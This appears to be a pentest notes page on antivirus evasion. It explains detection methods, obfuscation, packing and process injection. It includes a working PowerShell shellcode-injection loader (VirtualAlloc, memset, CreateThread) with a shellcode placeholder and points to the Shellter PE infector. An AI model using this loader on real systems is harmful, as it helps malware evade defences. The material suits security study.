---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Antivirus Evasion

## Antivirus detection methodologies

AV relies on multiple methods in order to detect malwares.

### Signature-based Detection

Signature-based is the most traditional method. The AV software compares files or strings against a database of known malware signatures. \
When it finds a match, it flags the file as malicious and quarantines it.

### **Heuristic-Based Detection**

Heuristics look for suspicious patterns or behaviors, such as code obfuscation, the use of certain functions often found in malware, or unusual file structures.&#x20;

### **Behavioral Detection**

Behavior based analyzes the behavior of a binary file, usually by executing the file in an emulated environment such sandboxes or virtual machines, searching for malicious actions

### **Machine Learning Detection**

Machine Learning detection uses algorithms trained on vast amounts of data to identify malware. The system learns to distinguish between legit and malicious files by collecting and analyzing additional metadata.

## Antivirus evasion methodologies

There are multiple ways to bypass AVs detections which usually used combined.

### **Obfuscators**

Obfuscators modify the malware’s code so that it appears harmless to signature-based detection tools. Common tactics include renaming variables, changing control flow, and inserting junk code that doesn’t affect the execution but hides the true intent of the malware.

### **Encryption and Packing**

Encryption and packing techniques are used to compress or encrypt the malware payload. \
The malware is packed or encrypted, so its true payload is only Unpacked or decrypted at runtime. &#x20;

### **Process Hollowing or Injection**

Process memory injection is a technique where malware injects its malicious code into the memory space of another legitimate process. The malware uses system API functions to write its payload into the address space of another process. \
Then, the code will be executed within the context of this legitimate process, making it harder for antivirus solutions to detect.

Process hollowing is a stealthy technique where a legitimate process is launched and then its memory is replaced with malicious code.\
Once the process is in memory but before it starts execution, the malware “hollows out” the legitimate process's memory, replacing it with the malicious payload.&#x20;

***

## Antivirus evasion in practice

### Process Injection

The following example will demonstrate a malicious PowerShell script involving Process Shellcode Injection combined with Obfuscators method.

The source code bellow is a PowerShell Cmdlet which defines several Windows API functions.\
These Win API Functions enable memory management allowing manipulate memory and create threads directly.  Also, the variables names use to obfuscate the code.

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
```

The source code below shows the usage of the Win API and injecting the shellcode in to the legitimate process memory space.

```powershell
[Byte[]];   
[Byte[]] $var1 = <shellcode>

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

### Shellter

Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created.\
It can be used in order to inject shellcode into native Windows applications.

Shellter provides interactive mode and easy to operate.

> Our **primary focus** has been on **enhancing runtime evasion** to ensure your beacons and payloads are loaded as safely as possible against modern EDR solutions.

```
sudo apt install shellter
```

## References

{% embed url="https://www.virustotal.com/gui/" %}
VirusTotal
{% endembed %}

{% embed url="https://www.kali.org/tools/shellter/" %}
Shellter
{% endembed %}

